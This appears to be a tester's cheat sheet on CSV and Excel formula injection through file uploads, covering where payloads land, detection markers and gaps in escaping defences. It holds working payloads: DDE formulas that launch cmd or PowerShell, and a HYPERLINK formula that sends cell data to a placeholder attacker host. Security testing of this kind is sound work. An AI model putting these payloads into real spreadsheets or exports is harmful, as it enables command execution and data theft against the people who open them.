# CSV / Excel Formula Injection — the spreadsheet that executes

## The shape — a CSV/XLSX field starting with `=` `+` `-` `@` runs as a formula

The "upload" is data rows — a CSV import, an export that gets opened in
Excel, a bulk-contact upload. When a field's text starts with a formula
character, the spreadsheet app evaluates it on open.

```
=cmd|'/c calc'!A0
=HYPERLINK("https://YOU:8000/?d="&A1,"x")
+1+cmd|'/c calc'!A0
-2+3
@SUM(1+1)
```

The DDE/HYPERLINK formulas are the classic exfil + exec; the arithmetic
`1+1→2` is the detection marker (the rendered cell shows `2` = formula
executed).

## The upload-side surface — where the CSV lands

| Endpoint | Effect |
|---|---|
| CSV bulk import (users/products/contacts) | formulas stored — exec on admin's export+open |
| export/report generation from stored data | stored formula reaches a spreadsheet the admin opens |
| direct CSV download after upload | attacker opens it — self-only unless it lands admin-side |

The exploit chain is **second-order**: upload stores the payload, the
victim opens an export later — the formula runs in their spreadsheet.

## Detection markers — which lead chars survive

Test each lead char as a field value in the import:

```
=1+1        → renders 2 if evaluated
+1+1        → some parsers strip the + 
-1+1        → may be treated as negative number
@SUM(1+1)   → Excel treats @ as implicit intersection
=|1+1|      → not a formula lead but inside field content
```

A field rendered as `2` in a re-export, or an error like `formula parse`,
proves the formula context. A stored field served literally
(`"=1+1"` in the export) is the pre-exec state — the exec needs an
Excel/LibreOffice open.

## The escaping defense — and its gaps

- app prepends `'` (apostrophe) → Excel displays as literal — the real fix
- but: only prepends to `=` leads, not `+`/`-`/`@`/`tab`/`CR` leads — try
  all lead chars, not just `=`
- strips `=` inside the field — `==` → one survives; `1=cmd` after a
  non-formula lead doesn't matter; the lead char is what counts
- Excel itself injects the apostrophe only when typing — imports don't

## DDE — the exec variant

```
=cmd|'/c powershell IEX(...)'!_xlbgnm.A0
```

`cmd|...` is a DDE server call — Excel prompts but runs it; older Excel
didn't even prompt. LibreOffice honors `DDE("cmd";...)`. `WEBSERVICE` +
`HYPERLINK`/`FILTERXML` exfil over HTTP without exec prompt.

## The data-that-becomes-formula ambiguity — why this is upload-relevant

The CSV file itself is the upload; the field values are the payload — the
"file" is fine, the data inside it is the bug. Distinguishes it from
binary payloads: no shellcode, no polyglot — just text that a spreadsheet
interprets.

## Falsifiers

- every formula-leading field is stored/served escaped (`'` prefix) on
  every path an export reaches
- the CSV never reaches a spreadsheet the victim opens (stored
  server-side only, never exported)

## Output to record

- which lead char(s) survive into the re-export verbatim
- whether an export path reaches a victim-side spreadsheet
